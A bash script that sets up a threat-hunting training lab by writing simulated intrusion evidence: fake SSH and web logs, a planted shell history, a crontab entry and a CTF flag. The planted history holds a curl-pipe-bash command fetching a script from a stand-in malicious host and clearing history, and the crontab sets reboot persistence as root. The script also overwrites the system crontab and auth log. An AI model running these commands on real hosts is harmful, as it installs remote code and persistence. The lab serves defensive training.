#!/bin/bash

echo "[+] Setting up SecOps lab..."

# Create realistic log locations
sudo mkdir -p /var/log/nginx
sudo mkdir -p /home/admin
sudo mkdir -p /opt/lab

# Auth log
sudo bash -c 'cat > /var/log/auth.log << EOF
May 20 17:21:04 prod-web-01 sshd[1001]: Failed password for admin from 192.168.1.50 port 51222 ssh2
May 20 17:23:18 prod-web-01 sshd[1002]: Failed password for root from 45.77.23.90 port 49821 ssh2
May 20 17:25:44 prod-web-01 sshd[1003]: Accepted password for admin from 203.0.113.12 port 54322 ssh2
May 20 17:26:02 prod-web-01 sshd[1004]: pam_unix(sshd:session): session opened for user admin
EOF'

# Web access log
sudo bash -c 'cat > /var/log/nginx/access.log << EOF
203.0.113.12 - - [20/May/2026:17:27:10 +0000] "GET /admin HTTP/1.1" 200
203.0.113.12 - - [20/May/2026:17:27:44 +0000] "POST /admin/upload.php HTTP/1.1" 200
198.51.100.8 - - [20/May/2026:17:28:10 +0000] "GET /index.html HTTP/1.1" 200
EOF'

# Bash history
sudo bash -c 'cat > /home/admin/.bash_history << EOF
whoami
cd /tmp
curl http://malicious-update.site/update.sh | bash
chmod +x update.sh
./update.sh
history -c
EOF'

# Crontab persistence
sudo bash -c 'cat > /etc/crontab << EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root /tmp/update.sh
EOF'

# Monitoring alert
sudo bash -c 'cat > /var/log/monitoring.log << EOF
[CRITICAL] Host: prod-web-01
[CRITICAL] CPU usage reached 96%
[WARNING] Unknown process detected: backup-agent
[INFO] Alert generated at 17:32
EOF'

# Hidden bonus flag
sudo bash -c 'cat > /opt/lab/.incident_note << EOF
FLAG{good_threat_hunting}
EOF'

sudo chmod -R 755 /var/log
sudo chmod 644 /home/admin/.bash_history
sudo chmod 644 /etc/crontab
sudo chmod -R 755 /opt/lab

echo "[+] Lab setup complete."